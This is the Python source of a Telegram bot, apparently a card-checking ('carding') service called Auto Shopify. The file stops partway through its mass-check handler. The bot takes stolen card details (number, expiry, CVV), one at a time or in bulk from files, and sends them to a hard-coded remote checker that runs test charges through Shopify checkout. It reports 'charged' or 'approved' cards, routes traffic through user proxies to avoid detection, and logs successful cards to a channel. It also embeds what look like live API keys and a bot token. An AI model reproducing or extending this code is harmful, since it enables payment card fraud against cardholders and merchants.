import asyncio
import aiohttp
import aiofiles
import json
import os
import re
import random
import time
import datetime
import string
from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
from urllib.parse import urlparse

# ============ CONFIGURATION ============
API_ID = 35384207
API_HASH = "09c4bc9de62a417ccdd0c69b33912515"
BOT_TOKEN = "8374356501:AAGFx_JOHKFx65Hsb4MAJAkel1XNNi0MfpE"
ADMIN_ID = [8731795570, 8199994609]
LOG_CHANNEL_ID = -1003413954160

# Files
PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"
STATS_FILE = "user_stats.json"
SITES_FILE = "user_sites.json"

# Active processes
ACTIVE_CHECKS = {}

# ============ BOLD FONT CONVERTER ============
def bold_text(text):
    """Convert normal text to bold/monospace font (𝗕𝗼𝗹𝗱 𝗦𝘁𝘆𝗹𝗲)"""
    bold_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝', 'K': '𝗞', 'L': '𝗟',
        'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥', 'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫',
        'Y': '𝗬', 'Z': '𝗭', 'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
        'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿', 's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃',
        'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇', '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳',
        '8': '𝟴', '9': '𝟵', '!': '!', '?': '?', '.': '.', ',': ',', '-': '-', '_': '_', ' ': ' ', ':': ':', '/': '/', '|': '|'
    }
    return ''.join(bold_map.get(c, c) for c in text)

# ============ LIVE EMOJIS WITH IDs ============
# REPLACE THESE IDs WITH YOUR ACTUAL CUSTOM EMOJI IDs FROM @getidsbot
LIVE_EMOJIS = {
    "check": {"id": "6136204644625423818", "char": "🔄"},
    "charged": {"id": "5891044423856296980", "char": "💎"},
    "approved": {"id": "6087133294648890399", "char": "✅"},
    "declined": {"id": "5042112436648281096", "char": "❌"},
    "order": {"id": "5226656353744862682", "char": "🛒"},
    "file": {"id": "5463424023734014980", "char": "🐍"},
    "time": {"id": "6179440452601647526", "char": "⏱️"},
    "card": {"id": "5472250091332993630", "char": "💳"},
    "gate": {"id": "6321225560789877992", "char": "🌐"},
    "price": {"id": "5453901475648390219", "char": "💰"},
    "user": {"id": "5958417144877160497", "char": "👤"},
    "proxy": {"id": "5042101437237036298", "char": "🔒"},
    "stats": {"id": "5226656353744862682", "char": "📊"},
    "crown": {"id": "5229011542011299168", "char": "👑"},
    "star": {"id": "5983292843836314861", "char": "⭐"},
    "warning": {"id": "5462882007451185227", "char": "⚠️"},
    "info": {"id": "6100619775426173201", "char": "ℹ️"},
    "lock": {"id": "5429405838345265327", "char": "🔒"},
    "trash": {"id": "5372825386591732174", "char": "🗑️"},
    "add": {"id": "5980797575211520457", "char": "➕"},
    "key": {"id": "5226656353744862682", "char": "🔑"},
    "redeem": {"id": "5041975203853239332", "char": "🎁"},
    "plan": {"id": "5463172695132745432", "char": "📦"},
    "payment": {"id": "5463046637842608206", "char": "💸"},
    "upi": {"id": "5201873447554145566", "char": "🏦"},
    "dm": {"id": "5372957680174384345", "char": "📩"},
    "back": {"id": "5253997076169115797", "char": "🔙"},
    "checked": {"id": "5278622189556354905", "char": "✔️"},
    "rocket": {"id": "5195033767969839232", "char": "🚀"},
    "fire": {"id": "5983168105101135589", "char": "🔥"},
    "heart": {"id": "5280745939215073717", "char": "❤️"},
    "sparkle": {"id": "5278251134446748886", "char": "✨"},
    "bin": {"id": "5854784287013867183", "char": "🔍"},
    "leaderboard": {"id": "5188344996356448758", "char": "🏆"},
    "broadcast": {"id": "5298609030321691620", "char": "📢"},
    "admin": {"id": "5278394972901492572", "char": "🛡️"},
    "globe": {"id": "5224450179368767019", "char": "🌍"},
    "remove": {"id": "5463121572137022242", "char": "➖"},
}

def get_live_emoji(key):
    if key in LIVE_EMOJIS:
        emoji = LIVE_EMOJIS[key]
        return f'<tg-emoji emoji-id="{emoji["id"]}">{emoji["char"]}</tg-emoji>'
    return "•"

# Create emoji variables
CHECK_EMOJI = get_live_emoji("check")
CHARGED_EMOJI = get_live_emoji("charged")
APPROVED_EMOJI = get_live_emoji("approved")
DECLINED_EMOJI = get_live_emoji("declined")
ORDER_EMOJI = get_live_emoji("order")
FILE_EMOJI = get_live_emoji("file")
TIME_EMOJI = get_live_emoji("time")
CARD_EMOJI = get_live_emoji("card")
GATE_EMOJI = get_live_emoji("gate")
PRICE_EMOJI = get_live_emoji("price")
USER_EMOJI = get_live_emoji("user")
PROXY_EMOJI = get_live_emoji("proxy")
STATS_EMOJI = get_live_emoji("stats")
CROWN_EMOJI = get_live_emoji("crown")
STAR_EMOJI = get_live_emoji("star")
WARNING_EMOJI = get_live_emoji("warning")
INFO_EMOJI = get_live_emoji("info")
LOCK_EMOJI = get_live_emoji("lock")
TRASH_EMOJI = get_live_emoji("trash")
ADD_EMOJI = get_live_emoji("add")
KEY_EMOJI = get_live_emoji("key")
REDEEM_EMOJI = get_live_emoji("redeem")
PLAN_EMOJI = get_live_emoji("plan")
PAYMENT_EMOJI = get_live_emoji("payment")
UPI_EMOJI = get_live_emoji("upi")
DM_EMOJI = get_live_emoji("dm")
BACK_EMOJI = get_live_emoji("back")
CHECKED_EMOJI = get_live_emoji("checked")
ROCKET_EMOJI = get_live_emoji("rocket")
FIRE_EMOJI = get_live_emoji("fire")
HEART_EMOJI = get_live_emoji("heart")
SPARKLE_EMOJI = get_live_emoji("sparkle")
BIN_EMOJI = get_live_emoji("bin")
LEADERBOARD_EMOJI = get_live_emoji("leaderboard")
BROADCAST_EMOJI = get_live_emoji("broadcast")
ADMIN_EMOJI = get_live_emoji("admin")
GLOBE_EMOJI = get_live_emoji("globe")
REMOVE_EMOJI = get_live_emoji("remove")

# ============ UTILITY FUNCTIONS ============
async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
        async with aiofiles.open(filename, "r") as f:
            return json.loads(await f.read())
    except:
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except:
        pass

async def get_user_stats(user_id):
    stats = await load_json(STATS_FILE)
    return stats.get(str(user_id), {"checked": 0, "charged": 0, "approved": 0, "declined": 0})

async def update_user_stats(user_id, status):
    stats = await load_json(STATS_FILE)
    if str(user_id) not in stats:
        stats[str(user_id)] = {"checked": 0, "charged": 0, "approved": 0, "declined": 0}
    
    stats[str(user_id)]["checked"] += 1
    if status == "charged":
        stats[str(user_id)]["charged"] += 1
    elif status == "approved":
        stats[str(user_id)]["approved"] += 1
    else:
        stats[str(user_id)]["declined"] += 1
    
    await save_json(STATS_FILE, stats)
    return stats[str(user_id)]

async def is_premium_user(user_id):
    premium = await load_json(PREMIUM_FILE)
    user_data = premium.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.datetime.fromisoformat(user_data['expiry'])
    if datetime.datetime.now() > expiry:
        del premium[str(user_id)]
        await save_json(PREMIUM_FILE, premium)
        return False
    return True

async def add_premium_user(user_id, days):
    premium = await load_json(PREMIUM_FILE)
    expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    premium[str(user_id)] = {'expiry': expiry.isoformat(), 'days': days}
    await save_json(PREMIUM_FILE, premium)

async def remove_premium_user(user_id):
    premium = await load_json(PREMIUM_FILE)
    if str(user_id) in premium:
        del premium[str(user_id)]
        await save_json(PREMIUM_FILE, premium)
        return True
    return False

async def is_banned_user(user_id):
    banned = await load_json(BANNED_FILE)
    return str(user_id) in banned

async def ban_user(user_id):
    banned = await load_json(BANNED_FILE)
    banned[str(user_id)] = {'banned_at': datetime.datetime.now().isoformat()}
    await save_json(BANNED_FILE, banned)

async def unban_user(user_id):
    banned = await load_json(BANNED_FILE)
    if str(user_id) in banned:
        del banned[str(user_id)]
        await save_json(BANNED_FILE, banned)
        return True
    return False

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def get_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id))

async def set_user_proxy(user_id, proxy_data):
    proxies = await load_json(PROXY_FILE)
    proxies[str(user_id)] = proxy_data
    await save_json(PROXY_FILE, proxies)

async def remove_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    if str(user_id) in proxies:
        del proxies[str(user_id)]
        await save_json(PROXY_FILE, proxies)
        return True
    return False

async def get_user_sites(user_id):
    sites = await load_json(SITES_FILE)
    return sites.get(str(user_id), [])

async def add_user_site(user_id, site):
    sites = await load_json(SITES_FILE)
    user_sites = sites.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        sites[str(user_id)] = user_sites
        await save_json(SITES_FILE, sites)
        return True
    return False

async def remove_user_site(user_id, site):
    sites = await load_json(SITES_FILE)
    user_sites = sites.get(str(user_id), [])
    if site in user_sites:
        user_sites.remove(site)
        sites[str(user_id)] = user_sites
        await save_json(SITES_FILE, sites)
        return True
    return False

def parse_proxy_format(proxy_str):
    import re
    proxy_str = proxy_str.strip()
    proxy_type = 'http'
    
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy_str = protocol_match.group(2)
    
    host = port = username = password = ''
    
    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy_str):
        match = re.match(r'^([^:@]+):(\d+)$', proxy_str)
        host, port = match.groups()
    else:
        return None
    
    if not host or not port:
        return None
    
    if username and password:
        proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
    else:
        proxy_url = f'{proxy_type}://{host}:{port}'
    
    return {'ip': host, 'port': port, 'username': username, 'password': password, 'proxy_url': proxy_url, 'type': proxy_type}

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except:
        return False, None

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    return "-", "-", "-", "-", "-", "🏳️"
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '🏳️')
                return brand, bin_type, level, bank, country, flag
    except:
        return "-", "-", "-", "-", "-", "🏳️"

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_urls_from_text(text):
    urls = re.findall(r'https?://[^\s]+|(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?:/\S*)?', text)
    return urls

def is_valid_url(url):
    url = url.lower()
    if url.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
            url = parsed.netloc
        except:
            return False
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, url))

async def check_card(card, proxy=None):
    try:
        url = f'http://108.165.12.183:8081/?cc={card}&url=https://shopify.com'
        if proxy:
            url += f'&proxy={proxy}'
        
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"status": "error", "response": f"HTTP {res.status}", "gateway": "-", "price": "-"}
                
                data = await res.json()
                response = data.get('Response', '')
                price = data.get('Price', '-')
                gateway = data.get('Gate', 'Shopify')
                
                if price != '-':
                    price = f"${price}"
                
                if "Order completed" in response or "charged" in response.lower():
                    return {"status": "charged", "response": response, "gateway": gateway, "price": price}
                elif "approved" in response.lower() or "success" in response.lower():
                    return {"status": "approved", "response": response, "gateway": gateway, "price": price}
                else:
                    return {"status": "declined", "response": response, "gateway": gateway, "price": price}
    except Exception as e:
        return {"status": "error", "response": str(e), "gateway": "-", "price": "-"}

# ============ TELEGRAM CLIENT ============
client = TelegramClient('auto_shopify_bot', API_ID, API_HASH)

# ============ COMMAND HANDLERS ============

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    
    if await is_banned_user(user_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')} {bold_text('Contact')} @DARK_FROXT_73", parse_mode='html')
    
    is_premium = await is_premium_user(user_id)
    stats = await get_user_stats(user_id)
    
    premium_text = f"{SPARKLE_EMOJI} {bold_text('Free')}"
    if is_premium:
        premium = await load_json(PREMIUM_FILE)
        user_data = premium.get(str(user_id), {})
        if user_data:
            expiry = datetime.datetime.fromisoformat(user_data['expiry'])
            days_left = (expiry - datetime.datetime.now()).days
            hours_left = (expiry - datetime.datetime.now()).seconds // 3600
            premium_text = f"{CROWN_EMOJI} {bold_text(f'Premium ({days_left}d {hours_left}h)')}"
    
    sender = await event.get_sender()
    name = sender.first_name or "User"
    username = f"@{sender.username}" if sender.username else bold_text("No username")
    
    message = f"""{CHECK_EMOJI} {bold_text('Auto Shopify')} 🔒

{USER_EMOJI} {bold_text('User Profile')}
• {bold_text('Name:')} {name}
• {bold_text('Username:')} {username}
• {bold_text('ID:')} `{user_id}`

• {bold_text('Plan:')} {premium_text}
• {bold_text('Proxy:')} {CHECKED_EMOJI if await get_user_proxy(user_id) else DECLINED_EMOJI} {bold_text('Active' if await get_user_proxy(user_id) else 'None')}

• {bold_text('Stats:')}
  - {bold_text('Checked:')} {stats['checked']}
  - {bold_text('Charged:')} {stats['charged']}
  - {bold_text('Approved:')} {stats['approved']}
  - {bold_text('CC Limit:')} {bold_text('Unlimited' if is_premium else '200')}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"""
    
    buttons = [
        [Button.inline(f"{CARD_EMOJI} {bold_text('Check CC')}", b"check_menu")],
        [Button.inline(f"{PROXY_EMOJI} {bold_text('Proxy Manager')}", b"proxy_menu")],
        [Button.inline(f"{USER_EMOJI} {bold_text('My Profile')}", b"profile_menu")]
    ]
    
    await event.reply(message, buttons=buttons, parse_mode='html')


@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text:
            return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/add site.com`\n\n{bold_text('Example:')} `/add https://shopify.com`", parse_mode='html')
        
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add:
            return await event.reply(f"{WARNING_EMOJI} {bold_text('No valid URLs/domains found!')}", parse_mode='html')
        
        user_sites = await get_user_sites(event.sender_id)
        added_sites = []
        already_exists = []
        
        for site in sites_to_add:
            if site in user_sites:
                already_exists.append(site)
            else:
                user_sites.append(site)
                added_sites.append(site)
        
        sites_data = await load_json(SITES_FILE)
        sites_data[str(event.sender_id)] = user_sites
        await save_json(SITES_FILE, sites_data)
        
        response = []
        if added_sites:
            response.append(f"{ADD_EMOJI} {bold_text('Added Sites:')}\n" + "\n".join([f"• `{s}`" for s in added_sites]))
        if already_exists:
            response.append(f"{WARNING_EMOJI} {bold_text('Already Exists:')}\n" + "\n".join([f"• `{s}`" for s in already_exists]))
        
        if response:
            await event.reply("\n\n".join(response), parse_mode='html')
        else:
            await event.reply(f"{WARNING_EMOJI} {bold_text('No new sites to add!')}", parse_mode='html')
            
    except Exception as e:
        await event.reply(f"{DECLINED_EMOJI} {bold_text(f'Error: {e}')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text:
            return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/rm site.com`", parse_mode='html')
        
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove:
            return await event.reply(f"{WARNING_EMOJI} {bold_text('No valid URLs/domains found!')}", parse_mode='html')
        
        user_sites = await get_user_sites(event.sender_id)
        removed_sites = []
        not_found_sites = []
        
        for site in sites_to_remove:
            if site in user_sites:
                user_sites.remove(site)
                removed_sites.append(site)
            else:
                not_found_sites.append(site)
        
        sites_data = await load_json(SITES_FILE)
        sites_data[str(event.sender_id)] = user_sites
        await save_json(SITES_FILE, sites_data)
        
        response = []
        if removed_sites:
            response.append(f"{REMOVE_EMOJI} {bold_text('Removed Sites:')}\n" + "\n".join([f"• `{s}`" for s in removed_sites]))
        if not_found_sites:
            response.append(f"{WARNING_EMOJI} {bold_text('Not Found:')}\n" + "\n".join([f"• `{s}`" for s in not_found_sites]))
        
        if response:
            await event.reply("\n\n".join(response), parse_mode='html')
        else:
            await event.reply(f"{WARNING_EMOJI} {bold_text('No sites were removed!')}", parse_mode='html')
            
    except Exception as e:
        await event.reply(f"{DECLINED_EMOJI} {bold_text(f'Error: {e}')}", parse_mode='html')


@client.on(events.NewMessage(pattern='/sites'))
async def list_sites(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    user_sites = await get_user_sites(event.sender_id)
    
    if not user_sites:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('No sites added!')}\n\n{bold_text('Use /add to add sites.')}", parse_mode='html')
    
    sites_list = "\n".join([f"{GLOBE_EMOJI} `{site}`" for site in user_sites])
    message = f"""{GLOBE_EMOJI} {bold_text('Your Sites')} ({len(user_sites)})

{sites_list}

{bold_text('Commands:')}
{ADD_EMOJI} `/add <site>` - {bold_text('Add site')}
{REMOVE_EMOJI} `/rm <site>` - {bold_text('Remove site')}"""
    
    await event.reply(message, parse_mode='html')


@client.on(events.CallbackQuery(data=b"check_menu"))
async def check_menu(event):
    buttons = [
        [Button.inline(f"{CARD_EMOJI} {bold_text('Single CC')}", b"single_cc")],
        [Button.inline(f"{STATS_EMOJI} {bold_text('Mass CC')}", b"mass_cc")],
        [Button.inline(f"{FILE_EMOJI} {bold_text('File Check')}", b"file_check")],
        [Button.inline(f"{SPARKLE_EMOJI} {bold_text('Random Check')}", b"random_check")],
        [Button.inline(f"{BACK_EMOJI} {bold_text('Back')}", b"back_main")]
    ]
    await event.edit(f"{CARD_EMOJI} {bold_text('Select Check Type:')}", buttons=buttons, parse_mode='html')


@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def proxy_menu(event):
    user_proxy = await get_user_proxy(event.sender_id)
    proxy_status = f"{CHECKED_EMOJI} {bold_text('Active:')} `{user_proxy['ip']}:{user_proxy['port']}`" if user_proxy else f"{DECLINED_EMOJI} {bold_text('No proxy set')}"
    
    buttons = [
        [Button.inline(f"{ADD_EMOJI} {bold_text('Add Proxy')}", b"add_proxy")],
        [Button.inline(f"{INFO_EMOJI} {bold_text('View Proxy')}", b"view_proxy")],
        [Button.inline(f"{TRASH_EMOJI} {bold_text('Remove Proxy')}", b"remove_proxy")],
        [Button.inline(f"{BACK_EMOJI} {bold_text('Back')}", b"back_main")]
    ]
    
    await event.edit(f"{PROXY_EMOJI} {bold_text('Proxy Manager')}\n\n{proxy_status}\n\n{bold_text('Proxy is tested before saving.')}", buttons=buttons, parse_mode='html')


@client.on(events.CallbackQuery(data=b"profile_menu"))
async def profile_menu(event):
    user_id = event.sender_id
    is_premium = await is_premium_user(user_id)
    stats = await get_user_stats(user_id)
    user_sites = await get_user_sites(user_id)
    
    premium_text = f"{SPARKLE_EMOJI} {bold_text('Free')}"
    if is_premium:
        premium = await load_json(PREMIUM_FILE)
        user_data = premium.get(str(user_id), {})
        if user_data:
            expiry = datetime.datetime.fromisoformat(user_data['expiry'])
            days_left = (expiry - datetime.datetime.now()).days
            hours_left = (expiry - datetime.datetime.now()).seconds // 3600
            premium_text = f"{CROWN_EMOJI} {bold_text(f'Premium ({days_left}d {hours_left}h)')}"
    
    sender = await event.get_sender()
    name = sender.first_name or "User"
    username = f"@{sender.username}" if sender.username else bold_text("No username")
    
    message = f"""{USER_EMOJI} {bold_text('User Profile')}

• {bold_text('Name:')} {name}
• {bold_text('Username:')} {username}
• {bold_text('ID:')} `{user_id}`

• {bold_text('Plan:')} {premium_text}
• {bold_text('Proxy:')} {CHECKED_EMOJI if await get_user_proxy(user_id) else DECLINED_EMOJI} {bold_text('Active' if await get_user_proxy(user_id) else 'None')}
• {bold_text('Sites:')} {len(user_sites)}

• {bold_text('Stats:')}
  - {bold_text('Checked:')} {stats['checked']}
  - {bold_text('Charged:')} {stats['charged']}
  - {bold_text('Approved:')} {stats['approved']}
  - {bold_text('Declined:')} {stats['declined']}
  - {bold_text('CC Limit:')} {bold_text('Unlimited' if is_premium else '200')}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"""
    
    buttons = [[Button.inline(f"{BACK_EMOJI} {bold_text('Back')}", b"back_main")]]
    await event.edit(message, buttons=buttons, parse_mode='html')


@client.on(events.CallbackQuery(data=b"back_main"))
async def back_main(event):
    await start(event)


@client.on(events.CallbackQuery(data=b"single_cc"))
async def single_cc_prompt(event):
    await event.edit(f"{CARD_EMOJI} {bold_text('Single CC Check')}\n\n{bold_text('Send CC in format:')}\n`4111111111111111|12|25|123`\n\n{bold_text('Or reply to a message containing CC.')}", parse_mode='html')
    await event.answer(bold_text("Send your CC now!"), alert=True)


@client.on(events.CallbackQuery(data=b"mass_cc"))
async def mass_cc_prompt(event):
    await event.edit(f"{STATS_EMOJI} {bold_text('Mass CC Check')}\n\n{bold_text('Send multiple CCs (one per line):')}\n`4111111111111111|12|25|123`\n`4111111111111112|12|25|123`", parse_mode='html')
    await event.answer(bold_text("Send CCs now!"), alert=True)


@client.on(events.CallbackQuery(data=b"file_check"))
async def file_check_prompt(event):
    await event.edit(f"{FILE_EMOJI} {bold_text('File Check')}\n\n{bold_text('Send a `.txt` file containing CCs (one per line)')}\n\n{bold_text('Example format:')}\n`4111111111111111|12|25|123`\n`4111111111111112|12|25|123`", parse_mode='html')
    await event.answer(bold_text("Send .txt file now!"), alert=True)


@client.on(events.CallbackQuery(data=b"random_check"))
async def random_check_prompt(event):
    await event.edit(f"{SPARKLE_EMOJI} {bold_text('Random Check')}\n\n{bold_text('Send a `.txt` file containing CCs. Bot will use random sites for checking.')}", parse_mode='html')
    await event.answer(bold_text("Send .txt file now!"), alert=True)


@client.on(events.CallbackQuery(data=b"add_proxy"))
async def add_proxy_prompt(event):
    await event.edit(f"{PROXY_EMOJI} {bold_text('Add Proxy')}\n\n{bold_text('Send proxy in format:')}\n`ip:port:username:password`\n`ip:port`\n`socks5://ip:port`\n\n{bold_text('Proxy will be tested before saving.')}", parse_mode='html')
    await event.answer(bold_text("Send proxy now!"), alert=True)


@client.on(events.CallbackQuery(data=b"view_proxy"))
async def view_proxy_action(event):
    user_proxy = await get_user_proxy(event.sender_id)
    if user_proxy:
        message = f"""{PROXY_EMOJI} {bold_text('Current Proxy')}

📍 {bold_text('Address:')} `{user_proxy['ip']}:{user_proxy['port']}`
🔒 {bold_text('Type:')} {user_proxy.get('type', 'http').upper()}
👤 {bold_text('Auth:')} {user_proxy.get('username', 'None')}

{CHECKED_EMOJI} {bold_text('Proxy is active and working')}"""
    else:
        message = f"{WARNING_EMOJI} {bold_text('No Proxy Set')}\n\n{bold_text('Use /addpxy or Proxy Manager to add a proxy.')}"
    
    buttons = [[Button.inline(f"{BACK_EMOJI} {bold_text('Back')}", b"proxy_menu")]]
    await event.edit(message, buttons=buttons, parse_mode='html')


@client.on(events.CallbackQuery(data=b"remove_proxy"))
async def remove_proxy_action(event):
    success = await remove_user_proxy(event.sender_id)
    if success:
        message = f"{CHECKED_EMOJI} {bold_text('Proxy removed successfully!')}"
    else:
        message = f"{WARNING_EMOJI} {bold_text('No proxy found to remove!')}"
    
    buttons = [[Button.inline(f"{BACK_EMOJI} {bold_text('Back')}", b"proxy_menu")]]
    await event.edit(message, buttons=buttons, parse_mode='html')


@client.on(events.NewMessage(pattern='/cmds'))
async def cmds(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    message = f"""{bold_text(Command List)} 📋

{bold_text('User Commands:')}
• /sh cc|mm|yy|cvv — {bold_text('Check a single CC')}
• /msh cc|mm|yy|cvv ... — {bold_text('Mass check (parallel)')}
• /mtxt — {bold_text('File check (reply to .txt)')}
• /ran — {bold_text('Random site check (reply to .txt)')}
• /add <site> — {bold_text('Add site to your list')}
• /rm <site> — {bold_text('Remove site from your list')}
• /sites — {bold_text('View your saved sites')}
• /proxy host:port:user:pass — {bold_text('Set proxy')}
• /myproxy — {bold_text('View current proxy')}
• /rmproxy — {bold_text('Remove proxy')}
• /bin 438854 — {bold_text('BIN lookup')}
• /redeem key — {bold_text('Redeem access key')}
• /plans — {bold_text('View premium plans')}
• /refer — {bold_text('Referral system')}
• /start — {bold_text('Main menu')}
• /cmds — {bold_text('This help message')}

{ADMIN_EMOJI} {bold_text(Admin Commands:)}
• /auth id days — {bold_text('Give premium access')}
• /unauth id — {bold_text('Remove premium access')}
• /key count days — {bold_text('Generate keys')}
• /ban id — {bold_text('Ban user')}
• /unban id — {bold_text('Unban user')}
• /stats — {bold_text('Bot statistics')}
• /broadcast — {bold_text('Send broadcast')}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"""
    
    await event.reply(message, parse_mode='html')


@client.on(events.NewMessage(pattern='/sh'))
async def sh(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    else:
        card = extract_card(event.raw_text)
    
    if not card:
        return await event.reply(f"{WARNING_EMOJI} {bold_text('Format:')} `/sh 4111111111111111|12|25|123`", parse_mode='html')
    
    status_msg = await event.reply(f"{CHECK_EMOJI} {bold_text('Checking CC...')}", parse_mode='html')
    
    proxy_data = await get_user_proxy(event.sender_id)
    proxy = proxy_data['proxy_url'] if proxy_data else None
    
    result = await check_card(card, proxy)
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
    
    await update_user_stats(event.sender_id, result['status'])
    
    if result['status'] == 'charged':
        await log_to_channel(event.sender_id, card, result, brand, bin_type, level, bank, country, flag)
    
    if result['status'] == 'charged':
        status_display = f"{ORDER_EMOJI} {bold_text('Order Placed!')} {ORDER_EMOJI}"
    elif result['status'] == 'approved':
        status_display = f"{APPROVED_EMOJI} {bold_text('APPROVED')} {APPROVED_EMOJI}"
    else:
        status_display = f"{DECLINED_EMOJI} {bold_text('DECLINED')} {DECLINED_EMOJI}"
    
    sender = await event.get_sender()
    username = f"@{sender.username}" if sender.username else sender.first_name
    
    message = f"""{status_display}

{CARD_EMOJI} {bold_text('CC:')} `{card}`
{GATE_EMOJI} {bold_text('Gate:')} {result['gateway']}
{PRICE_EMOJI} {bold_text('Price:')} {result['price']}

{bold_text('BIN Info:')}
• {bold_text('Brand:')} {brand}
• {bold_text('Type:')} {bin_type}
• {bold_text('Level:')} {level}
• {bold_text('Bank:')} {bank}
• {bold_text('Country:')} {country} {flag}

{CHECKED_EMOJI} {bold_text('Checked by:')} {username}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @Atulfroxt73_bot {STAR_EMOJI}"""
    
    await status_msg.delete()
    await event.reply(message, parse_mode='html')


@client.on(events.NewMessage(pattern='/msh'))
async def msh(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} {bold_text('You are banned!')}", parse_mode='html')
    
    cards = []
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            for line in replied.text.splitlines():
                card = extract_card(line)
                if card:
                    cards.append(card)
    else:
        text = event.raw_text[4:].strip()
        for line in text.splitlines():
            card = extract_card(line)
            if card:
